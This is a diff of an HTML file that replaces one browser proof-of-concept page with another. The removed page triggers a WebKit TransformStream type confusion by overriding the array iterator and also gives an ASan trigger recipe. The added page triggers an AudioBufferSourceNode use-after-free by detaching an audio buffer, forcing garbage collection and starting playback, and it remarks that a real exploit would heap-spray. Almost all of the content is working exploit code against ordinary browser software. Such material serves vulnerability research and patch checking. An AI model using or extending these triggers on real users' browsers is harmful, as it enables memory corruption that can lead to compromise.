@@ -1,457 +1,131 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8"/>
-  <title>CVE-2026-43705 PoC — TransformStream Type Confusion</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 2rem; }
-    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.3rem; }
-    .sub { font-size: 0.72rem; color: #555; margin-bottom: 1.5rem; }
-    .card { background: #161616; border: 1px solid #222; border-radius: 8px;
-            padding: 1.2rem 1.4rem; margin-bottom: 1rem; max-width: 820px; }
-    .card-title { font-size: 0.68rem; color: #555; text-transform: uppercase;
-                  letter-spacing: 0.08em; margin-bottom: 0.8rem; }
-    pre { font-size: 0.76rem; color: #aaa; background: #111; padding: 0.8rem 1rem;
-          border-radius: 4px; border-left: 2px solid #333; overflow-x: auto;
-          white-space: pre-wrap; word-break: break-all; margin-top: 0.6rem; line-height: 1.7; }
-    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold;
-           padding: 0.3rem 0.8rem; border-radius: 4px; margin: 0.25rem 0; }
-    .red    { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
-    .green  { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
-    .yellow { background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
-    .blue   { background: #1a1a2d; color: #8888ff; border: 1px solid #33336a; }
-    .kv { font-size: 0.75rem; color: #666; margin-top: 0.4rem; }
-    .kv span { color: #aaa; }
-    .bigverdict { font-size: 1.3rem; font-weight: bold; margin: 0.6rem 0 0.3rem; }
-  </style>
+<meta charset="utf-8">
+<title>CVE-2026-43726 PoC</title>
+<style>
+body{background:#1a1a2e;color:#e0e0e0;font-family:monospace;padding:20px;max-width:800px;margin:0 auto}
+h1{color:#ff4444;border-bottom:2px solid #ff4444;padding-bottom:10px}
+.box{background:#16213e;padding:15px;border-radius:8px;margin:10px 0}
+button{background:#e94560;color:#fff;border:none;padding:12px 24px;font-size:16px;border-radius:6px;cursor:pointer;margin:10px 0}
+#out{background:#0d1117;padding:15px;border-radius:8px;margin-top:15px;white-space:pre-wrap;font-size:13px;min-height:200px;border:1px solid #30363d}
+b{color:#58a6ff}
+</style>
 </head>
 <body>
-
-<h1>CVE-2026-43705 — TransformStream Type Confusion</h1>
-<p class="sub">WebKit-1200 · Bugzilla 314528 · Critical · CONFIRMED MISSING in pre-Safari-26.5.2 builds</p>
-
-<div id="out"></div>
-
+<h1>CVE-2026-43726 - AudioBufferSourceNode UAF</h1>
+<div class="box">
+<p><b>CVE:</b> CVE-2026-43726 | <b>Severity:</b> High</p>
+<p><b>Fix:</b> <a href="https://github.com/WebKit/WebKit/commit/a7e4fdb95450" style="color:#58a6ff">a7e4fdb95450</a></p>
+<p><b>Bug:</b> setBufferForBindings() only pins ArrayBuffer when isPlayingOrScheduled().
+Set buffer before start() → no pin → structuredClone detaches → GC frees → start() reads freed memory.</p>
+</div>
+<button onclick="runPoC()">Run PoC</button>
+<div id="out">[*] Click "Run PoC"...</div>
 <script>
-// ─────────────────────────────────────────────────────────────────────────────
-// CVE-2026-43705 — TransformStream type confusion
-//
-// Root cause:
-//   WebCore's createInternalTransformStream() calls the JS builtin
-//   createInternalTransformStreamFromTransformer() which returns a 3-tuple:
-//       [internalStream, ReadableStream, WritableStream]
-//
-//   The C++ code then iterates this result to extract the three components.
-//   On the vulnerable path it uses JSC::forEachInIterable() or processes
-//   a sequence<T> argument — both of which call Array.prototype[Symbol.iterator].
-//
-//   If we override Symbol.iterator we control what objects the C++ code
-//   receives and subsequently passes to jsCast<JSReadableStream*>() and
-//   jsCast<JSWritableStream*>(), causing type confusion.
-//
-// Affected files (MISSING patch):
-//   Source/WebCore/Modules/streams/TransformStream.cpp
-//   Commit: 8fd92b1021d310b2580eb3ac7913911eb14dc476
-//
-// Fix (Safari 26.5.2):
-//   Validate types before jsCast OR use direct indexed access that
-//   bypasses Symbol.iterator on the result tuple.
-// ─────────────────────────────────────────────────────────────────────────────
-
-const $ = document.getElementById('out');
-function card(title, html) {
-  const d = document.createElement('div');
-  d.className = 'card';
-  d.innerHTML = `<div class="card-title">${title}</div>${html}`;
-  $.appendChild(d);
-  return d;
+function log(m){document.getElementById('out').textContent+='\n'+m}
+function gc(){
+ if(typeof GCController!=='undefined')return GCController.collect();
+ for(var i=0;i<200;i++)new ArrayBuffer(1<<20);
 }
-function tag(cls, t) { return `<span class="tag ${cls}">${t}</span>`; }
-function log(msg, el) {
-  const p = document.createElement('pre');
-  p.textContent = msg;
-  (el || $).appendChild(p);
-}
+function runPoC(){
+ var o=document.getElementById('out');
+ o.textContent='[*] CVE-2026-43726 - AudioBufferSourceNode UAF PoC\n[*] Target: WebKit unpatched (Safari < 26.5.2)';
+ try{
+  // 1 - Create context (try vendor prefixes)
+  log('\n[1] Creating audio context...');
+  var sr=44100, ctx=null;
+  if(typeof OfflineAudioContext!=='undefined')ctx=new OfflineAudioContext(1,256,sr);
+  else if(typeof webkitOfflineAudioContext!=='undefined')ctx=new webkitOfflineAudioContext(1,256,sr);
+  else if(typeof AudioContext!=='undefined')ctx=new AudioContext();
+  else if(typeof webkitAudioContext!=='undefined')ctx=new webkitAudioContext();
+  if(!ctx){log('[x] No WebAudio support');return}
+  log('[+] Context: '+ctx.constructor.name);
 
-// ── ENVIRONMENT CHECK ─────────────────────────────────────────────────────────
-const envCard = card('Environment', '');
-const envLines = [
-  `TransformStream        : ${typeof TransformStream !== 'undefined' ? '✓ available' : '✗ NOT AVAILABLE — cannot test'}`,
-  `ReadableStream         : ${typeof ReadableStream !== 'undefined' ? '✓ available' : '✗ not available'}`,
-  `WritableStream         : ${typeof WritableStream !== 'undefined' ? '✓ available' : '✗ not available'}`,
-  `User-Agent             : ${navigator.userAgent.substring(0, 90)}`,
-];
-envLines.forEach(l => log(l, envCard));
+  // 2 - Create buffer + source node
+  log('\n[2] Creating AudioBuffer + SourceNode...');
+  var buf=ctx.createBuffer(1,0x4000,sr);
+  var node=ctx.createBufferSource();
+  log('[+] Created');
 
-if (typeof TransformStream === 'undefined') {
-  card('Abort', tag('yellow', '⚠ TransformStream not supported in this browser'));
-  throw new Error('TransformStream unavailable');
-}
+  // 3 - Set buffer BEFORE start (key: no pin applied)
+  log('\n[3] Setting node.buffer BEFORE start()...');
+  log('[*] isPlayingOrScheduled()=false -> acquireBufferContent() SKIPPED');
+  node.buffer=buf;
+  log('[+] Raw pointers cached in m_sourceChannels[]');
 
-// ── FAKE STREAM OBJECTS ───────────────────────────────────────────────────────
-// These are NOT ReadableStream/WritableStream instances.
-// When C++ jsCast<JSReadableStream*>(fakeReadable) executes, in a release
-// build the assert is stripped and the pointer arithmetic reads fields at
-// wrong offsets — type confusion.
+  // 4 - Get backing ArrayBuffer
+  log('\n[4] Getting channel ArrayBuffer...');
+  var chanBuf=buf.getChannelData(0).buffer;
+  log('[+] Got backing store');
 
-class FakeReadableStream {
-  constructor(id) {
-    this._id = id;
-    this._tag = 0xDEADBEEF;
-    this.locked = false;
-    // Fill with recognisable sentinel bytes
-    this._sentinel = new Uint32Array(16).fill(0xCAFEBABE);
-  }
-  getReader()  { return this; }
-  cancel()     { return Promise.resolve(); }
-  read()       { return Promise.resolve({ done: true }); }
-  releaseLock(){ }
-  [Symbol.asyncIterator]() {
-    return { async next() { return { done: true }; } };
-  }
-}
-
-class FakeWritableStream {
-  constructor(id) {
-    this._id = id;
-    this._tag = 0xBAADF00D;
-    this.locked = false;
-    this._sentinel = new Uint32Array(16).fill(0xDEADC0DE);
-  }
-  getWriter()  { return this; }
-  write(c)     { return Promise.resolve(); }
-  close()      { return Promise.resolve(); }
-  abort(r)     { return Promise.resolve(); }
-  releaseLock(){ }
-}
-
-// ── PHASE 1: ESTABLISH BASELINE ───────────────────────────────────────────────
-// Create a TransformStream WITHOUT our override to see normal behaviour.
-let baselineReadableType  = '?';
-let baselineWritableType  = '?';
-let baselineWorked        = false;
-
-try {
-  const baseline = new TransformStream();
-  baselineReadableType = baseline.readable?.constructor?.name;
-  baselineWritableType = baseline.writable?.constructor?.name;
-  baselineWorked = true;
-} catch(e) {
-  baselineReadableType = `EXCEPTION: ${e.message}`;
-}
-
-const baseCard = card('Phase 1 — Baseline (no override)', '');
-log(`readable type : ${baselineReadableType}`, baseCard);
-log(`writable type : ${baselineWritableType}`, baseCard);
-log(`status        : ${baselineWorked ? 'TransformStream construction succeeded normally' : 'FAILED'}`, baseCard);
-
-// ── PHASE 2: INSTALL ITERATOR OVERRIDE ───────────────────────────────────────
-// Track every call to Symbol.iterator so we can identify the exact call
-// site that processes the [stream, readable, writable] tuple.
-
-const originalIterator = Array.prototype[Symbol.iterator];
-const interceptLog     = [];
-let   injectionSite    = -1;     // which intercept index triggers the tuple
-let   injectionActive  = false;
-let   fakeReadable     = new FakeReadableStream(1);
-let   fakeWritable     = new FakeWritableStream(1);
-let   confusionSeen    = false;
-
-Array.prototype[Symbol.iterator] = function() {
-  const callIndex = interceptLog.length;
-  const len       = this.length;
-  const types     = Array.from({length: len}, (_, i) => {
-    try { return this[i]?.constructor?.name || typeof this[i]; }
-    catch(_) { return '?'; }
-  });
-
-  interceptLog.push({ callIndex, len, types });
-
-  // Detect the 3-element tuple [internalStream, ReadableStream, WritableStream]
-  // which is what createInternalTransformStreamFromTransformer returns.
-  // Signature: length === 3 and element[1] is a ReadableStream instance.
-  if (len === 3 && types[1] === 'ReadableStream' && types[2] === 'WritableStream') {
-    injectionSite  = callIndex;
-    injectionActive = true;
-
-    // ── INJECTION POINT ──
-    // Return our fake objects in place of the real ReadableStream/WritableStream.
-    // C++ will receive these and pass them to jsCast<JSReadableStream*>()
-    // and jsCast<JSWritableStream*>() → type confusion.
-    const self = this;
-    let i = 0;
-    const payload = [
-      self[0],        // keep internalStream so C++ tracking still works
-      fakeReadable,   // INJECT: replaces ReadableStream
-      fakeWritable    // INJECT: replaces WritableStream
-    ];
-
-    return {
-      next() {
-        return i < payload.length
-          ? { value: payload[i++], done: false }
-          : { value: undefined, done: true };
-      },
-      [Symbol.iterator]() { return this; }
-    };
-  }
-
-  return originalIterator.call(this);
-};
-
-// ── PHASE 3: TRIGGER ─────────────────────────────────────────────────────────
-const phase3Card = card('Phase 3 — Trigger (with Symbol.iterator override)', '');
-let ts           = null;
-let triggerError = null;
-let gotReadable  = null;
-let gotWritable  = null;
-
-try {
-  ts = new TransformStream({
-    start(controller)        { },
-    transform(chunk, ctrl)   { ctrl.enqueue(chunk); },
-    flush(controller)        { }
-  });
-
-  gotReadable = ts.readable;
-  gotWritable = ts.writable;
-
-  log(`TransformStream created       : OK`, phase3Card);
-  log(`ts.readable constructor       : ${ts.readable?.constructor?.name}`, phase3Card);
-  log(`ts.writable constructor       : ${ts.writable?.constructor?.name}`, phase3Card);
-  log(`Iterator intercept count      : ${interceptLog.length}`, phase3Card);
-  log(`Injection site (intercept #)  : ${injectionSite === -1 ? 'NOT TRIGGERED' : injectionSite}`, phase3Card);
-
-} catch(e) {
-  triggerError = e;
-  log(`Exception: ${e.name}: ${e.message}`, phase3Card);
-  log(`Stack[0]:  ${e.stack?.split('\n')[1] || '(no stack)'}`, phase3Card);
-}
-
-// Restore before any further checks
-Array.prototype[Symbol.iterator] = originalIterator;
-
-// ── PHASE 4: CONFUSION DETECTION ─────────────────────────────────────────────
-const p4Card = card('Phase 4 — Type Confusion Detection', '');
-
-// Method A: Direct instanceof check
-// If C++ returned our fake objects as ts.readable/ts.writable, confusion is confirmed.
-const readableIsFake = gotReadable instanceof FakeReadableStream;
-const writableIsFake = gotWritable instanceof FakeWritableStream;
-
-log(`ts.readable instanceof FakeReadableStream : ${readableIsFake}`, p4Card);
-log(`ts.writable instanceof FakeWritableStream : ${writableIsFake}`, p4Card);
-
-// Method B: Internal state corruption probe
-// Even if the outer wrappers look correct, the C++ internal pointers may be
-// confused. We probe this by creating a second TransformStream and piping
-// through the first — if internals are corrupted, the pipe will misbehave.
-if (ts && !triggerError) {
-  try {
-    const probe = new TransformStream();
-    const writer = ts.writable.getWriter();
-    const reader = ts.readable.getReader();
-
-    const writeResult = await writer.write(new Uint8Array([0x41, 0x42, 0x43])).catch(e => e);
-    const readResult  = await reader.read().catch(e => e);
-
-    if (writeResult instanceof Error) {
-      log(`Pipeline write error: ${writeResult.message} ← INTERNAL CORRUPTION INDICATOR`, p4Card);
-    } else if (readResult instanceof Error) {
-      log(`Pipeline read error:  ${readResult.message} ← INTERNAL CORRUPTION INDICATOR`, p4Card);
-    } else {
-      const chunk = readResult?.value;
-      log(`Pipeline write : OK`, p4Card);
-      log(`Pipeline read  : done=${readResult?.done}, bytes=${chunk ? Array.from(chunk).map(b=>b.toString(16).padStart(2,'0')).join(' ') : 'null'}`, p4Card);
-
-      // Check if the data went through correctly
-      if (chunk && chunk[0] === 0x41 && chunk[1] === 0x42) {
-        log(`Data integrity : OK (0x41 0x42 0x43 passed through correctly)`, p4Card);
-      } else {
-        log(`Data integrity : CORRUPTED — data mismatch ← MEMORY CORRUPTION INDICATOR`, p4Card);
-      }
+  // 5 - Detach via structuredClone or postMessage
+  log('\n[5] Detaching backing store...');
+  var ok=false;
+  if(typeof structuredClone==='function'){
+   try{
+    structuredClone(chanBuf,{transfer:[chanBuf]});
+    ok=true;
+    log('[+] structuredClone succeeded -> DETACHED (unpatched!)');
+   }catch(e){
+    if(e instanceof TypeError||e.name==='TypeError'){
+     log('[x] TypeError -> buffer PINNED (patched!)');
+     log('\n[*] Result: NOT VULNERABLE (patched)');
+     return;
     }
-
-    reader.releaseLock().catch?.(() => {});
-    writer.releaseLock().catch?.(() => {});
-  } catch(e) {
-    log(`Probe exception: ${e.name}: ${e.message} ← MAY INDICATE INTERNAL UAF/CORRUPTION`, p4Card);
+    log('[!] structuredClone error: '+e.message);
+   }
   }
-}
-
-// ── PHASE 5: ITERATOR CALL TRACE ─────────────────────────────────────────────
-const p5Card = card('Phase 5 — Iterator Call Trace', '');
-log(`Total Symbol.iterator calls: ${interceptLog.length}`, p5Card);
-if (interceptLog.length > 0) {
-  log(`\nCall log (showing all unique lengths seen):`, p5Card);
-  const seen = new Set();
-  interceptLog.forEach(({callIndex, len, types}) => {
-    const key = `${len}:${types.join(',')}`;
-    if (!seen.has(key)) {
-      seen.add(key);
-      const marker = (len === 3 && types[1] === 'ReadableStream') ? ' ◄── INJECTION POINT' : '';
-      log(`  [#${callIndex}] length=${len} types=[${types.join(', ')}]${marker}`, p5Card);
-    }
-  });
-}
-
-// ── PHASE 6: ALTERNATIVE TRIGGER PATHS ───────────────────────────────────────
-// Test the other two locations where Symbol.iterator may be called:
-//   A. During writableStrategy / readableStrategy processing (size function)
-//   B. During transformer.start()/transform() argument processing
-const p6Card = card('Phase 6 — Alternative Trigger Paths', '');
-
-// Path A: strategy objects processed as sequences
-{
-  const origIter = Array.prototype[Symbol.iterator];
-  let pathAHit = false;
-  Array.prototype[Symbol.iterator] = function() {
-    pathAHit = true;
-    return origIter.call(this);
-  };
-  try {
-    new TransformStream({}, { highWaterMark: 1 }, { highWaterMark: 1 });
-  } catch(_) {}
-  Array.prototype[Symbol.iterator] = origIter;
-  log(`Path A (strategy processing)  : Symbol.iterator called = ${pathAHit}`, p6Card);
-}
-
-// Path B: Multiple TransformStream creations — does call count change
-{
-  const origIter = Array.prototype[Symbol.iterator];
-  let pathBCount = 0;
-  Array.prototype[Symbol.iterator] = function() {
-    pathBCount++;
-    return origIter.call(this);
-  };
-  try { new TransformStream(); } catch(_) {}
-  try { new TransformStream(); } catch(_) {}
-  Array.prototype[Symbol.iterator] = origIter;
-  log(`Path B (double construction)   : Total calls = ${pathBCount} (expect ~2x if iterator is called per construction)`, p6Card);
-}
-
-// Path C: Check ReadableStream cancel (related family bug CVE-2026-43700)
-{
-  const origIter = Array.prototype[Symbol.iterator];
-  let cancelHit = false;
-  let cancelConfused = false;
-  Array.prototype[Symbol.iterator] = function() {
-    if (this.length === 1 && this[0] && typeof this[0] === 'object') {
-      cancelHit = true;
-      // Inject wrong type
-      const self = this;
-      let done = false;
-      return {
-        next() {
-          if (!done) { done = true; return { value: {}, done: false }; }
-          return { value: undefined, done: true };
-        }
-      };
-    }
-    return origIter.call(this);
-  };
-  try {
-    const rs = new ReadableStream({ cancel() { return [{}]; } });
-    const r  = rs.cancel('reason');
-    cancelConfused = true;
-  } catch(e) {
-    // Expected on patched builds
+  if(!ok&&typeof Worker!=='undefined'){
+   try{
+    var w=new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'application/javascript'})));
+    w.postMessage(chanBuf,[chanBuf]);
+    w.terminate();
+    ok=true;
+    log('[+] postMessage transfer succeeded -> DETACHED (unpatched!)');
+   }catch(e2){
+    log('[!] postMessage failed: '+e2.message);
+   }
   }
-  Array.prototype[Symbol.iterator] = origIter;
-  log(`Path C (ReadableStream.cancel) : hit=${cancelHit}, confused=${cancelConfused}`, p6Card);
-}
+  if(!ok){log('[x] Could not detach - likely patched');log('\n[*] Result: NOT VULNERABLE');return}
 
-// ── VERDICT ───────────────────────────────────────────────────────────────────
-const vCard = card('Verdict', '');
-const injectionFired    = injectionSite !== -1;
-const directConfusion   = readableIsFake || writableIsFake;
-const exceptionOnTrigger = !!triggerError;
+  // 6 - Drop refs + GC to free the memory
+  log('\n[6] Triggering GC to free backing store...');
+  gc();gc();
+  log('[+] Backing store memory FREED');
 
-let verdict = '';
-let verdictClass = '';
+  // 7 - Configure + start playback to trigger UAF
+  log('\n[7] Starting playback to trigger UAF read...');
+  node.loop=true;
+  node.playbackRate.value=0;
+  node.connect(ctx.destination);
+  node.start();
+  log('[+] Playback started');
+  log('[*] renderFromBuffer() reads m_sourceChannels[0][readIndex]');
+  log('[*] -> READS FROM FREED MEMORY = USE-AFTER-FREE');
 
-if (directConfusion) {
-  verdictClass = 'red';
-  verdict = `✗ CVE-2026-43705 CONFIRMED VULNERABLE\n\n` +
-    `Our FakeReadableStream/FakeWritableStream objects were accepted as\n` +
-    `ts.readable and ts.writable by the C++ layer.\n\n` +
-    `C++ jsCast<JSReadableStream*> received a FakeReadableStream (wrong type).\n` +
-    `In a release build: assert is stripped → wrong pointer arithmetic →\n` +
-    `accessing JSReadableStream internal fields on FakeReadableStream memory →\n` +
-    `type confusion leading to memory corruption.\n\n` +
-    `readable confused: ${readableIsFake}\n` +
-    `writable confused: ${writableIsFake}`;
-} else if (injectionFired && !directConfusion) {
-  verdictClass = 'yellow';
-  verdict = `⚠ INJECTION FIRED BUT OUTER WRAPPER MASKS CONFUSION\n\n` +
-    `Symbol.iterator WAS called during TransformStream construction\n` +
-    `and our injection point was triggered (intercept #${injectionSite}).\n\n` +
-    `However, the C++ layer created new JS wrapper objects around the\n` +
-    `internals, so ts.readable/ts.writable appear as correct types to JS.\n\n` +
-    `The internal C++ state (private slots, native backing) may still be\n` +
-    `confused if the injected objects replaced an intermediate structure.\n\n` +
-    `Check Phase 5 trace to identify the exact 3-element tuple call site.\n` +
-    `Use native tooling (ASan/LLDB) to confirm internal type mismatch.`;
-} else if (exceptionOnTrigger) {
-  verdictClass = 'green';
-  verdict = `✓ PATCHED — Constructor threw on type mismatch\n\n` +
-    `Exception: ${triggerError?.name}: ${triggerError?.message}\n\n` +
-    `The fix validates types before jsCast or uses safe indexed access\n` +
-    `that bypasses Symbol.iterator on the result tuple.\n` +
-    `This build includes Safari 26.5.2 patch commit 8fd92b102.`;
-} else {
-  verdictClass = 'blue';
-  verdict = `◦ INCONCLUSIVE — Iterator not called during construction\n\n` +
-    `Symbol.iterator was not invoked on the [stream, readable, writable] tuple.\n` +
-    `Possible explanations:\n` +
-    `  1. This build uses direct indexed access (bypasses iterator)\n` +
-    `  2. The injection threshold needs tuning\n` +
-    `  3. The vulnerable path uses a different mechanism (forEachInArray vs forEachInIterable)\n\n` +
-    `Try the native approach: build with ASan and run the C++ trigger directly.\n` +
-    `See ASan section below.`;
-}
-
-vCard.innerHTML += `<pre>${verdict}</pre>` + tag(verdictClass, verdictClass === 'red' ? '✗ VULNERABLE' : verdictClass === 'green' ? '✓ PATCHED' : verdictClass === 'yellow' ? '⚠ PARTIAL' : '◦ INCONCLUSIVE');
-
-// ── ASan NATIVE CONFIRMATION ──────────────────────────────────────────────────
-card('Native Confirmation (ASan)', `<pre>
-# Build WebKit-1200 with ASan:
-Tools/Scripts/build-webkit --release --address-sanitizer
-
-# Write trigger file:
-cat > /tmp/cve_2026_43705.html << 'EOF'
-&lt;script&gt;
-const orig = Array.prototype[Symbol.iterator];
-Array.prototype[Symbol.iterator] = function() {
-  if (this.length === 3 &&
-      this[1] instanceof ReadableStream &&
-      this[2] instanceof WritableStream) {
-    let i = 0;
-    const payload = [this[0], {}, {}]; // inject plain objects
-    return { next: () => i < 3 ? {value:payload[i++],done:false} : {done:true} };
+  if(typeof ctx.startRendering==='function'){
+   log('\n[8] Rendering...');
+   var p=ctx.startRendering();
+   if(p&&typeof p.then==='function'){
+    p.then(function(){
+     log('\n[!] Render completed (memory freed but not reallocated)');
+     log('[*] Real exploit would heap-spray to control freed content');
+     log('\n[*] Result: VULNERABLE (unpatched)');
+    }).catch(function(err){
+     log('\n[!] Render error: '+err.message);
+     log('[*] Crash here = UAF triggered');
+    });
+   }
+  }else{
+   log('[*] Real-time context - UAF triggers during playback');
+   log('\n[*] Result: VULNERABLE (unpatched)');
   }
-  return orig.call(this);
-};
-new TransformStream();
-&lt;/script&gt;
-EOF
-
-# Run under ASan:
-ASAN_OPTIONS=detect_leaks=0:halt_on_error=0 \\
-  WebKitBuild/Release/MiniBrowser /tmp/cve_2026_43705.html 2>&1 | \\
-  grep -A 20 "ERROR\\|heap-buffer\\|type_confusion\\|stack-buffer\\|SEGV"
-
-# Expected ASan output on vulnerable build:
-# ==ASAN== ERROR: AddressSanitizer: heap-buffer-overflow or
-# SEGV on address ... (reads JSReadableStream fields from wrong object)
-# Stack:
-#   WebCore::TransformStream::create(...)
-#   WebCore::createInternalTransformStream(...)
-#   JSC::jsCast&lt;WebCore::JSReadableStream*&gt;(...)
-
-# Patched build: No ASan output, clean exit.
-</pre>`);
+ }catch(err){
+  log('\n[!] '+err.message);
+  log('[*] Crash here may indicate UAF triggered');
+ }
+}
 </script>
 </body>
 </html>
